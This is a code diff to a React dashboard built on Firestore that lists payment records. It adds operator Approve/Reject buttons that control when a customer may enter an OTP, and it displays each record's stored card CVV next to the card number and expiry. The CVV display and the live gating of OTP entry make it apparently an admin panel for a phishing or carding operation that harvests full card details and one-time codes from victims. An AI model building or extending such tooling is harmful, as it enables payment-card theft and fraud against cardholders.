@@ -75,6 +75,15 @@ function getDisplayName(record: PayRecord): string {
 
 function getLastMessage(record: PayRecord): string {
   const paymentStatus = record.payment?.status ?? record.status;
+  if (paymentStatus === "pending_review") {
+    return "Waiting dashboard approval";
+  }
+  if (paymentStatus === "approved") {
+    return "Approved - customer can enter OTP";
+  }
+  if (paymentStatus === "rejected") {
+    return "Card rejected from dashboard";
+  }
   if (paymentStatus === "otp_failed") {
     return "OTP failed - needs review";
   }
@@ -119,8 +128,14 @@ function toGroupedCardNumber(value: string): string {
 }
 
 function getStatusBadge(status?: string): { label: string; className: string } {
-  if (status === "otp_failed") {
-    return { label: "Failed", className: "bg-[#3b1414] text-[#ff9f9f]" };
+  if (status === "pending_review") {
+    return { label: "Under Review", className: "bg-[#3b2e14] text-[#ffd888]" };
+  }
+  if (status === "approved") {
+    return { label: "Approved", className: "bg-[#113744] text-[#8ddfff]" };
+  }
+  if (status === "rejected" || status === "otp_failed") {
+    return { label: "Rejected", className: "bg-[#3b1414] text-[#ff9f9f]" };
   }
   if (status === "otp_verified") {
     return { label: "Verified", className: "bg-[#143224] text-[#7bf3b0]" };
@@ -135,6 +150,9 @@ export default function Dashboard() {
   const [isLoading, setIsLoading] = useState(true);
   const [error, setError] = useState<string | null>(null);
   const [isMarkingRead, setIsMarkingRead] = useState(false);
+  const [decisionLoading, setDecisionLoading] = useState<
+    "approve" | "reject" | null
+  >(null);
 
   useEffect(() => {
     setIsLoading(true);
@@ -234,6 +252,41 @@ export default function Dashboard() {
       setError(message);
     } finally {
       setIsMarkingRead(false);
+    }
+  };
+
+  const onUpdateDecision = async (decision: "approved" | "rejected") => {
+    if (!selectedRecord) {
+      return;
+    }
+
+    setDecisionLoading(decision === "approved" ? "approve" : "reject");
+    try {
+      await setDoc(
+        doc(db, "pays", selectedRecord.id),
+        {
+          status: decision,
+          payment: {
+            ...(selectedRecord.payment ?? {}),
+            status: decision,
+            errorMessage:
+              decision === "rejected"
+                ? "تم رفض البطاقة من لوحة التحكم."
+                : null,
+          },
+          updatedAt: new Date().toISOString(),
+        },
+        { merge: true }
+      );
+      setError(null);
+    } catch (decisionError) {
+      const message =
+        decisionError instanceof Error
+          ? decisionError.message
+          : "Unable to update payment decision.";
+      setError(message);
+    } finally {
+      setDecisionLoading(null);
     }
   };
 
@@ -371,6 +424,22 @@ export default function Dashboard() {
                     </span>
                     <button
                       type="button"
+                      onClick={() => onUpdateDecision("approved")}
+                      disabled={decisionLoading !== null}
+                      className="rounded-full border border-[#1f4f3a] bg-[#1a8e4c] px-3 py-1 text-xs font-semibold text-white hover:bg-[#14723c] disabled:cursor-not-allowed disabled:opacity-60"
+                    >
+                      {decisionLoading === "approve" ? "Approving..." : "Approve"}
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => onUpdateDecision("rejected")}
+                      disabled={decisionLoading !== null}
+                      className="rounded-full border border-[#5a1a1a] bg-[#a63535] px-3 py-1 text-xs font-semibold text-white hover:bg-[#8d2c2c] disabled:cursor-not-allowed disabled:opacity-60"
+                    >
+                      {decisionLoading === "reject" ? "Rejecting..." : "Reject"}
+                    </button>
+                    <button
+                      type="button"
                       onClick={onMarkAsRead}
                       disabled={!selectedRecord.isUnread || isMarkingRead}
                       className="rounded-full border border-[#2a3942] bg-[#202c33] px-3 py-1 text-xs font-semibold text-[#d5dfe4] hover:bg-[#2a3942] disabled:cursor-not-allowed disabled:opacity-60"
@@ -449,6 +518,9 @@ export default function Dashboard() {
                             {selectedRecord.payment?.expiry ?? "--/--"}
                           </p>
                         </div>
+                      </div>
+                      <div className="mt-3 inline-flex rounded-md bg-black/20 px-2.5 py-1 text-xs font-semibold">
+                        CVV: {selectedRecord.payment?.cvv ?? "--"}
                       </div>
                     </div>
 
